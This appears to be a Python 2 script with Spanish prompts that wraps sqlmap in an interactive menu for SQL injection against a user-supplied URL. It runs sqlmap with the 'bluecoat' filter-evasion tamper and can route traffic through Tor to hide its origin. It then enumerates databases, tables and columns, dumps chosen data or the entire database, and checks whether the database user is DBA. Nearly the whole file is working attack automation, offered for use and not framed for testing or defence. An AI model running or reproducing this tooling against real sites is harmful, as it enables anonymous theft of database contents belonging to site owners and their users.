#!/usr/bin/python2
# encoding: utf-8
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
import subprocess
def rsk():
    try:
        global risk
        risk=int(raw_input("Introduce tu valor para --risk (1-3): "))
        if risk < 1 or risk > 3:
            print "El valor solo puede ser de 1 a 3."
            rsk()
        else:
            risk=str(risk)
            return risk
    except ValueError:
        print "Por favor, el valor solo puede ser numerico."
        rsk()
    except KeyboardInterrupt:
        print "Saliendo."

def lev():
    try:
        global level
        level=int(raw_input("Introduce tu valor para --level (1-5): "))
        if level < 1 or level > 5:
            print "El valor solo puede ser de 1 a 5."
            lev()
        else:
            level=str(level)
            return level
    except ValueError:
        print "Por favor, el valor solo puede ser numerico."
        lev()
    except KeyboardInterrupt:
        print "Saliendo."
      
def sqlinorm():
    global url
    url=raw_input("introduce la url vulnerable a sqli: ")
    if url != "":
        lev()
        rsk()
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
        postsqli()
    else:
        sqlinorm()
def sqlitor():
    global url
    url=raw_input("introduce la url vulnerable a sqli: ")
    if url != "":
        lev()
        rsk()
        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
        postsqli()
    else:
        sqlitor()

def sqlipost():
    global url
    url=raw_input("introduce la url vulnerable a sqli: ")
    global post
    post=raw_input("introduce los datos post para la inyeccion sqli: ")
    if url != "" and post != "":
        lev()
        rsk()
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
        postsqli()
    else:
        sqlipost()

def sqlipostor():
    global url
    url=raw_input("introduce la url vulnerable a sqli: ")
    global post
    post=raw_input("introduce los datos post para la inyeccion sqli: ")
    if url != "" and post != "":
        lev()
        rsk()
        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
        postsqli()
    else:
        sqlipostor()
def postdb():
    db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
    if db != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"--tables"])
    else:
        postdb()
def posttables():
    db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
    table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
    if db != "" and table != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"--columns"])
    else:
        posttables()
def postcolumns():
    db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
    table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
    columns=raw_input("Introduce el nombre de la columna que quieres extraer los datos, o columnas separadas por coma si son varias: ")
    if db != "" and table != "" and columns != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"-C",columns,"--dump"])
    else:
        postcolumns()

def isdba():
    print "Comprobando si el usuario actual es root de MySQL ..."
    outp = open("sqlopt/output.txt", "w")
    subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--is-dba"],stdout=outp)
    if 'current user is DBA:    False' in open('sqlopt/output.txt').read():
        print "El usuario no es root."
    elif 'current user is DBA:    True' in open('sqlopt/output.txt').read():
        print "El usuario es root!, esto es fascinante!!."
    else:
        print "Resultado inesperado."

def dumpall():
    print """Dumpeando toda la base de datos, esto puede tomar un largo tiempo...
    Continue solo en caso de que sepa lo que esta haciendo.
    """
    decide=raw_input("Deseas continuar? (y/n): ")
    if decide == "y":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dump-all"])
    elif decide == "n":
        print "Saliendo."
    else:
        print "Opcion equivovada, por favor verifique."
        dumpall()

def postsqli():
    print """ Elige lo que quieres hacer:
        a) Extraer todas las tablas de una base de datos.
        b) Extraer todas las columnas de una tabla.
        c) Extraer todo de una o mas columnas.
        d) Dumpear toda la DataBase.
        e) Comprobar si el usuario MySQL es root.
        f) Salir.
        """
    sel=raw_input("Teclea tu opcion: ")
    if sel == "f":
        print "Saliendo."
    elif sel == "a":
        postdb()
        postsqli()
    elif sel == "b":
        posttables()
        postsqli()
    elif sel == "c":
        postcolumns()
        postsqli()
    elif sel == "d":
        dumpall()
    elif sel == "e":
        isdba()
    else:
        postsqli()

def execute():
    print"""Selecciona tu opcion:
    a) Sqli usando sqlmap sin proxy.
    b) Sqli usando sqlmap con TOR.
    c) Sqli usando post inyeccion.
    d) Sqli usando post inyeccion con TOR.
    """
    selec=raw_input("Teclea tu opcion: ")
    if selec == "a":
        sqlinorm()
    elif selec == "b":
        sqlitor()
    elif selec == "c":
        sqlipost()
    elif selec == "d":
        sqlipostor()
    else:
        execute()
    
